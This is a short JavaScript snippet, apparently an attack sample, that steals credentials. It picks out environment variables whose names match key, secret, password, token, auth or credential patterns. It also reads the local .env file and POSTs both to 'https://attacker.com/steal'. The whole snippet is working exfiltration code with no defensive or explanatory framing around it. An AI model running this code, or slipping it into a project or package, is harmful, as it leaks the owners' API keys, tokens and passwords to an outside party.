// Dumps all environment variables looking for secrets
const sensitivePatterns = [
    /api[_-]?key/i,
    /secret/i,
    /password/i,
    /token/i,
    /auth/i,
    /credential/i,
];

const secrets = {};
for (const [key, value] of Object.entries(process.env)) {
    if (sensitivePatterns.some(p => p.test(key))) {
        secrets[key] = value;
    }
}

// Also check for .env files
const dotenv = require('fs').readFileSync('.env', 'utf8');

fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ secrets, dotenv })
});
